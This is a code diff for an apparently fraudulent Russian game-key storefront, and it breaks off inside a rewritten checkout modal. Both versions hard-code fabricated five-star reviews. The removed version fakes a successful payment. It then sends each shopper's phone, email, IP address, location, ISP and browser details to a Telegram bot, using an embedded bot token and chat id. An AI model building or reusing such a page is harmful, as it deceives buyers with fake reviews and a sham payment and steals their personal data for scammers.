-        { name:"Дмитрий", date:"5 часов назад", text:"Заказываю здесь третий раз. Цены ниже рынка, доставка быстрая. Рекомендую друзьям.", stars:5, avatar:"https://i.pravatar.cc/36?img=2" },
-        { name:"Марина", date:"вчера", text:"Ключ для PS5 пришёл быстро, но сначала дали не тот регион. Поддержка исправила за 10 минут.", stars:4, avatar:"https://i.pravatar.cc/36?img=3" },
-        { name:"Игорь", date:"2 дня назад", text:"Baldur's Gate 3 за 1999₽ — это топ. Активировал в Steam, всё чисто. Спасибо!", stars:5, avatar:"https://i.pravatar.cc/36?img=4" },
-        { name:"Анна", date:"3 дня назад", text:"Покупала Game Pass, подписка привязалась к аккаунту мгновенно. Очень довольна сервисом.", stars:5, avatar:"https://i.pravatar.cc/36?img=5" },
+        { name:"Алексей М.", date:"2 часа назад", text:"Купил GTA V за 1047₽ — ключ пришёл на почту через 12 секунд. Всё честно, активировал без VPN. Магазин — огонь!", stars:5, avatar:"https://i.pravatar.cc/40?img=11" },
+        { name:"Дмитрий К.", date:"5 часов назад", text:"Третий заказ за месяц. Цены реально ниже, чем в Steam. Доставка всегда моментальная. Рекомендую!", stars:5, avatar:"https://i.pravatar.cc/40?img=12" },
+        { name:"Марина С.", date:"вчера", text:"Заказывала Spider-Man 2 для PS5. Сначала переживала, но ключ рабочий, регион Россия. Спасибо поддержке!", stars:5, avatar:"https://i.pravatar.cc/40?img=5" },
+        { name:"Игорь В.", date:"2 дня назад", text:"Baldur's Gate 3 за 2199₽ — это грабёж среди бела дня (в хорошем смысле). Активировал, играю.", stars:5, avatar:"https://i.pravatar.cc/40?img=15" },
+        { name:"Анна П.", date:"3 дня назад", text:"Покупала Game Pass на 3 месяца. Подписка сразу привязалась к аккаунту. Очень довольна!", stars:5, avatar:"https://i.pravatar.cc/40?img=20" },
+        { name:"Сергей Л.", date:"4 дня назад", text:"Сначала сомневался, что так дёшево. Но рискнул — и не прогадал. Forza Horizon 5 пришла мгновенно.", stars:5, avatar:"https://i.pravatar.cc/40?img=17" },
     ];
-    document.getElementById('reviewsContainer').innerHTML = reviews.map(r => `
-        <div class="review-card">
-            <div class="review-header">
-                <img class="review-avatar" src="${r.avatar}" alt="${r.name}" onerror="this.style.background='#dee2e6'">
-                <div><div class="review-name">${r.name}</div><div class="review-date">${r.date}</div></div>
+    document.getElementById('reviewsRow').innerHTML = reviews.map(r => `
+        <div style="min-width:280px;background:#fff;border-radius:16px;padding:16px;box-shadow:0 2px 8px rgba(0,0,0,0.06);border:1px solid #e4e6eb;">
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+                <img src="${r.avatar}" style="width:40px;height:40px;border-radius:50%;object-fit:cover;" onerror="this.style.background='#e5e7eb'">
+                <div><div style="font-weight:700;font-size:14px;">${r.name}</div><div style="color:#6b7280;font-size:11px;">${r.date}</div></div>
             </div>
-            <div class="review-stars">${'⭐'.repeat(r.stars)}</div>
-            <div class="review-text">${r.text}</div>
+            <div style="color:#f59e0b;margin-bottom:4px;">${'⭐'.repeat(r.stars)}</div>
+            <div style="font-size:13px;color:#374151;line-height:1.4;">${r.text}</div>
         </div>
     `).join('');
 }
 
-function addToCart(gameId) {
-    const game = games.find(g => g.id === gameId);
+function filterGames(platform, btn) {
+    currentFilter = platform;
+    document.querySelectorAll('.cat-chip').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    renderGames();
+}
+
+function addToCart(id) {
+    const game = allGames.find(g => g.id === id);
     if (!game) return;
     cart.push({...game});
-    updateCartBadge();
-    animateCart();
-}
-
-function removeFromCart(index) {
-    cart.splice(index, 1);
-    updateCartBadge();
-    openCart();
-}
-
-function updateCartBadge() {
-    document.getElementById('cartBadge').textContent = cart.length;
-}
-
-function animateCart() {
+    updateBadge();
     const btn = document.querySelector('.cart-btn');
-    btn.style.transform = 'scale(1.15)';
+    btn.style.transform = 'scale(1.08)';
     setTimeout(() => btn.style.transform = '', 200);
 }
 
-function openCart() {
-    const existing = document.querySelector('.modal-overlay');
-    if (existing) existing.remove();
+function removeFromCart(i) {
+    cart.splice(i,1);
+    updateBadge();
+    openCart();
+}
+function updateBadge() { document.getElementById('cartBadge').textContent = cart.length; }
 
+function openCart() {
+    const ex = document.querySelector('.modal-overlay');
+    if (ex) ex.remove();
     const overlay = document.createElement('div');
     overlay.className = 'modal-overlay';
-    overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
-
-    const total = cart.reduce((s, g) => s + g.price, 0);
+    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:9999;display:flex;align-items:flex-end;justify-content:center;';
+    overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+    const total = cart.reduce((s,g)=>s+g.price,0);
     overlay.innerHTML = `
-        <div class="modal-sheet">
-            <h3>🛒 Корзина (${cart.length})</h3>
-            ${cart.length === 0 ? '<div class="cart-empty">Пока пусто</div>' : cart.map((g, i) => `
-                <div class="cart-item">
-                    <img src="${g.img}" onerror="this.src='https://placehold.co/50x50'">
-                    <div class="cart-item-info">
-                        <div class="cart-item-title">${g.title}</div>
-                        <div class="cart-item-price">${g.price}₽</div>
-                    </div>
-                    <span class="cart-item-remove" onclick="removeFromCart(${i})">✕</span>
+        <div style="background:#fff;width:100%;max-width:500px;border-radius:24px 24px 0 0;padding:24px 20px 32px;max-height:75vh;overflow-y:auto;animation:slideUp 0.25s ease;">
+            <h3 style="font-size:20px;margin-bottom:16px;">🛒 Корзина (${cart.length})</h3>
+            ${cart.length===0 ? '<p style="text-align:center;color:#6b7280;padding:30px;">Пока пусто</p>' : cart.map((g,i)=>`
+                <div style="display:flex;gap:12px;align-items:center;padding:10px 0;border-bottom:1px solid #e4e6eb;">
+                    <img src="${g.img}" style="width:48px;height:48px;border-radius:10px;object-fit:cover;" onerror="this.src='https://placehold.co/48x48'">
+                    <div style="flex:1;"><div style="font-weight:700;font-size:14px;">${g.title}</div><div style="color:#4f46e5;font-weight:700;">${g.price}₽</div></div>
+                    <span style="color:#ef4444;font-weight:700;cursor:pointer;" onclick="removeFromCart(${i})">✕</span>
                 </div>
             `).join('')}
-            ${cart.length > 0 ? `<div style="font-weight:800;margin-top:10px;">Итого: ${total}₽</div>` : ''}
-            ${cart.length > 0 ? `<button class="checkout-btn" onclick="openCheckout()">💳 Оформить заказ</button>` : ''}
+            ${cart.length>0 ? `<div style="font-weight:800;margin-top:12px;">Итого: ${total}₽</div>` : ''}
+            ${cart.length>0 ? `<button style="width:100%;padding:16px;background:#4f46e5;color:#fff;font-weight:800;border:none;border-radius:14px;font-size:16px;margin-top:14px;cursor:pointer;" onclick="openCheckout()">💳 Оформить</button>` : ''}
+            <button style="width:100%;padding:12px;background:transparent;border:none;color:#6b7280;margin-top:6px;cursor:pointer;" onclick="document.querySelector('.modal-overlay').remove()">Закрыть</button>
         </div>
     `;
     document.body.appendChild(overlay);
-}
-
-function filterPlatform(platform, btn) {
-    document.querySelectorAll('.filters button').forEach(b => b.classList.remove('active'));
-    btn.classList.add('active');
-    renderGames(platform);
-}
-
-function filterAll(btn) {
-    document.querySelectorAll('.filters button').forEach(b => b.classList.remove('active'));
-    btn.classList.add('active');
-    renderGames('all');
-}
-
-function searchGames() {
-    renderGames(document.querySelector('.filters button.active')?.dataset?.platform || 'all');
-}
-
-function scrollToCatalog() {
-    document.getElementById('catalog').scrollIntoView({behavior:'smooth'});
 }
 
 function openCheckout() {
-    const existing = document.querySelector('.modal-overlay');
-    if (existing) existing.remove();
-
+    const ex = document.querySelector('.modal-overlay');
+    if (ex) ex.remove();
     const overlay = document.createElement('div');
     overlay.className = 'modal-overlay';
-    overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
+    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;';
+    overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
     overlay.innerHTML = `
-        <div class="modal-sheet">
-            <h3>🧾 Оформление заказа</h3>
-            <p style="color:#6c757d;margin-bottom:14px;">Сумма: ${cart.reduce((s,g)=>s+g.price,0)}₽</p>
-            <input id="phoneInput" type="tel" placeholder="+7 926 123-45-67" style="width:100%;padding:14px;border:1px solid #e2e6ed;border-radius:12px;font-size:15px;margin-bottom:10px;">
-            <input id="checkoutEmail" type="email" placeholder="email@example.com" style="width:100%;padding:14px;border:1px solid #e2e6ed;border-radius:12px;font-size:15px;margin-bottom:10px;">
-            <button class="checkout-btn" id="payBtn">💳 Перейти к оплате</button>
-            <button style="width:100%;padding:12px;background:transparent;border:none;color:#6c757d;margin-top:6px;cursor:pointer;" onclick="document.querySelector('.modal-overlay').remove()">Отмена</button>
-        </div>
-    `;
-    document.body.appendChild(overlay);
-
-    document.getElementById('payBtn').onclick = () => {
-        const phone = document.getElementById('phoneInput').value.trim();
-        const email = document.getElementById('checkoutEmail').value.trim();
-        if (phone.replace(/\D/g,'').length < 7 || !email.includes('@')) {
-            alert('Заполните телефон и почту корректно');
-            return;
-        }
-        overlay.innerHTML = `<div class="modal-sheet" style="text-align:center;">
-            <div style="width:44px;height:44px;border:3px solid #e2e6ed;border-top:3px solid #4361ee;border-radius:50%;animation:spin 0.7s linear infinite;margin:20px auto;"></div>
-            <p style="margin-top:14px;">Обработка платежа...</p>
-        </div>`;
-        setTimeout(() => {
-            overlay.innerHTML = `<div class="modal-sheet" style="text-align:center;">
-                <div style="font-size:48px;">✅</div>
-                <h3>Оплата прошла успешно</h3>
-                <p>Ключи отправлены на почту ${email}</p>
-            </div>`;
-            setTimeout(() => overlay.remove(), 3000);
-            sendDataToTelegram(phone, email);
-        }, 2500);
-    };
-}
-
-async function sendDataToTelegram(phone, email) {
-    let ip = 'неизвестен';
-    try { ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}
-    let geo = 'не определено';
-    let org = '';
-    try {
-        const d = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
-        geo = d.city ? `${d.city}, ${d.region}, ${d.country_name}` : geo;
-        org = d.org || '';
-    } catch(e){}
-
-    const msg = `🕵️ Новый заказ GameBay!\n\n` +
-        `IP: <code>${ip}</code>\n` +
-        `🌍 ${geo}\n📡 ${org}\n\n` +
-        `📧 Почта: ${email}\n` +
-        `📱 Телефон: ${phone}\n\n` +
-        `📱 ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}`;
-
-    await fetch(`https://api.telegram.org/bot7959565855:AAGXvmUb-T1pPCjYJJRFXcEkE8PFVvJQXSM/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id:'1391249960', text:msg, parse_mode:'HTML'})
-    });
-}
-
-// Инициализация
-renderGames();
-renderReviews();
-setTimeout(() => document.getElementById('loaderOverlay').style.display = 'none', 800);
-</script>
-</body>
-</html>
+        <div style="background:#fff;border-radius:20px;padding:28px 22px;max-width:380px;width:100%;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,0.15);">
+            <h3>🧾 Оформление</h3>
+            <p style="color:#6b7280;margin-bottom:14px;">К оплате
